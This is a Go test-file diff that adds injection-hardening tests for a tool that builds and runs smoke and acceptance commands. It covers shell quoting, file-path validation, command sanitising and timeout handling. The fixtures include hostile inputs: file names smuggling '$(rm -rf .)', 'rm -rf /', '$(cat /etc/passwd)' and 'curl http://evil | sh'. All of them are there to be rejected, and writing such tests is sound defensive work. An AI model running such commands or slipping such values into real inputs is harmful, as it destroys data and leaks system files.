@@ -4,6 +4,7 @@ import (
 	"context"
 	"os"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"testing"
 	"time"
@@ -185,5 +186,182 @@ func TestRunPostWorkerSmokeGoVetStripsTestFlags(t *testing.T) {
 	}
 	if !strings.HasPrefix(sr.Command, "go vet ") {
 		t.Fatalf("expected go vet smoke, got %q", sr.Command)
+	}
+}
+
+// ── shell quoting must suppress substitution ───────────────────────────────
+
+func TestShellQuoteUsesSingleQuotes(t *testing.T) {
+	cases := []struct {
+		name, in, want string
+	}{
+		{"plain path", "pkg/a.go", "pkg/a.go"},
+		{"space", "my file.py", `'my file.py'`},
+		{"command substitution", "$(rm -rf .).py", `'$(rm -rf .).py'`},
+		{"backtick", "a`id`.py", "'a`id`.py'"},
+		{"variable", "$HOME/x.py", `'$HOME/x.py'`},
+		{"embedded single quote", "it's.py", `'it'\''s.py'`},
+		{"double quote", `a"b.py`, `'a"b.py'`},
+		{"empty", "", "''"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			if got := shellQuote(tc.in); got != tc.want {
+				t.Fatalf("shellQuote(%q)=%s want %s", tc.in, got, tc.want)
+			}
+		})
+	}
+}
+
+func TestSafeFocusPath(t *testing.T) {
+	cases := []struct {
+		in   string
+		want bool
+	}{
+		{"pkg/a.go", true},
+		{"a_b-c.py", true},
+		{"x@1.0/main.js", true},
+		{"", false},
+		{"$(id).py", false},
+		{"a b.py", false},
+		{"a;rm -rf /.py", false},
+		{"a\nb.py", false},
+		{"a`id`.py", false},
+		{"../escape.py", false},
+		{"-rf", false},
+		{strings.Repeat("a", 600), false},
+	}
+	for _, tc := range cases {
+		t.Run(tc.in, func(t *testing.T) {
+			if got := SafeFocusPath(tc.in); got != tc.want {
+				t.Fatalf("SafeFocusPath(%q)=%v want %v", tc.in, got, tc.want)
+			}
+		})
+	}
+}
+
+func TestDetectPostWorkerCommandDropsUnsafeFocusPaths(t *testing.T) {
+	root := t.TempDir()
+	// Create a real file with a hostile name so it exists on disk.
+	nasty := "$(touch pwned).py"
+	if err := os.WriteFile(filepath.Join(root, nasty), []byte("x=1\n"), 0o644); err != nil {
+		t.Skipf("filesystem rejects the name: %v", err)
+	}
+	if err := os.WriteFile(filepath.Join(root, "ok.py"), []byte("x=1\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	cmd := DetectPostWorkerCommand(root, []string{nasty, "ok.py"})
+	if strings.Contains(cmd, "$(") || strings.Contains(cmd, "pwned") {
+		t.Fatalf("hostile focus path must never reach a command line: %q", cmd)
+	}
+	if !strings.Contains(cmd, "ok.py") {
+		t.Fatalf("safe paths must still be used: %q", cmd)
+	}
+}
+
+// ── acceptance commands must be argv-shaped, never free-form shell ─────────
+
+func TestSanitizeAcceptanceCommand(t *testing.T) {
+	cases := []struct {
+		name, cmd, prefix, want string
+	}{
+		{"plain", "go test ./... -short", "go test", "go test ./... -short"},
+		{"pytest with node id", "pytest tests/test_a.py::test_b -q", "pytest ", "pytest tests/test_a.py::test_b -q"},
+		{"chained and", "go test ./... && curl evil", "go test", ""},
+		{"pipe to shell", "go test ./... | sh", "go test", ""},
+		{"substitution", "go test $(id)", "go test", ""},
+		{"backtick", "go test `id`", "go test", ""},
+		{"semicolon", "go test .; rm -rf /", "go test", ""},
+		{"redirect", "go test . > /etc/passwd", "go test", ""},
+		{"newline", "go test .\nrm -rf /", "go test", ""},
+		{"glob", "go test *", "go test", ""},
+		{"quotes", `go test "./..."`, "go test", ""},
+		{"wrong prefix", "curl evil", "go test", ""},
+		{"too long", "go test " + strings.Repeat("x", 400), "go test", ""},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			if got := SanitizeAcceptanceCommand(tc.cmd, tc.prefix); got != tc.want {
+				t.Fatalf("got %q want %q", got, tc.want)
+			}
+		})
+	}
+}
+
+func TestExtractAcceptanceCommandsRejectsInjection(t *testing.T) {
+	cases := []struct {
+		name       string
+		acceptance string
+		wantNone   bool
+		wantCmd    string
+	}{
+		{"clean", "Run go test ./... -short", false, "go test ./... -short"},
+		{"chained", "go test ./... && curl http://evil | sh", true, ""},
+		{"substitution", "go test $(cat /etc/passwd)", true, ""},
+		{"redirect", "pytest -q > /tmp/out", true, ""},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			got := ExtractAcceptanceCommands(tc.acceptance)
+			if tc.wantNone {
+				for _, c := range got {
+					if strings.ContainsAny(c, "&|;`$><") {
+						t.Fatalf("shell metacharacters survived: %q", c)
+					}
+				}
+				return
+			}
+			if len(got) != 1 || got[0] != tc.wantCmd {
+				t.Fatalf("got %q want [%q]", got, tc.wantCmd)
+			}
+		})
+	}
+}
+
+// ── bounded, process-group-killed execution ────────────────────────────────
+
+func TestRunSmokeTimesOutAndKillsChildren(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("process groups differ on Windows")
+	}
+	root := t.TempDir()
+	marker := filepath.Join(root, "child-alive")
+	start := time.Now()
+	sr := RunSmoke(context.Background(), root,
+		"bash -c 'sleep 5; touch "+marker+"' & wait", 400*time.Millisecond)
+	if sr.OK {
+		t.Fatal("a timed-out command must not report success")
+	}
+	if elapsed := time.Since(start); elapsed > 4*time.Second {
+		t.Fatalf("orphaned child held the runner for %s", elapsed)
+	}
+	if !strings.Contains(sr.Summary, "timed out") {
+		t.Fatalf("summary should name the timeout: %q", sr.Summary)
+	}
+	time.Sleep(1500 * time.Millisecond)
+	if _, err := os.Stat(marker); err == nil {
+		t.Fatal("child survived the timeout — the process group was not killed")
+	}
+}
+
+func TestRunSmokeBoundsOutput(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("bash not guaranteed on Windows")
+	}
+	sr := RunSmoke(context.Background(), t.TempDir(),
+		"for i in $(seq 1 100000); do echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa; done", time.Minute)
+	if len(sr.Output) > 25_000 {
+		t.Fatalf("output not bounded: %d bytes", len(sr.Output))
+	}
+}
+
+func TestRunSmokeDoesNotUseLoginShell(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("bash not guaranteed on Windows")
+	}
+	// bash -c leaves BASH_ENV/profile untouched; -lc would source the profile.
+	sr := RunSmoke(context.Background(), t.TempDir(), `shopt -q login_shell && echo LOGIN || echo NONLOGIN`, time.Minute)
+	if !strings.Contains(sr.Output, "NONLOGIN") {
+		t.Fatalf("commands must not run in a login shell: %q", sr.Output)
 	}
 }
